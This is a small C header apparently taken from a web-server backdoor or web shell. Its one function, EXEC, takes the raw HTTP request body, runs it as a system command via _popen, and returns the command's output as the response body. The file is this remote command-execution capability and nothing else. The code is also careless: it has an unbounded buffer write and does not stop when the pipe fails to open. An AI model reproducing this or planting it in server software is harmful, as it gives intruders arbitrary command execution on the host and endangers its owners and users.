#pragma once
#define BUF_SIZE 4096
//Input RequestBody £¬ Request Content-Length AND Pointer of ResponseBody
SIZE_T EXEC(PUCHAR pEntityBuffer, int Length, char* RESULT)
{
    SIZE_T size = 0, n;
    pEntityBuffer[Length] = '\x00';

    //Define buffer                        
    FILE* PIPE = _popen((char*)pEntityBuffer, "r");
    //Open the pipe and execute the command 
    if (!PIPE)
    {
        printf("wrong!");
    };
    while (!feof(PIPE))
    {
        if (n=fread((void*)RESULT,sizeof(char),BUF_SIZE,PIPE)) {
            //Output pipeline to result  
            size += n;
            RESULT += n;
        }
    }
    //CLOSE PIPE
	_pclose(PIPE);                            
    return size;
}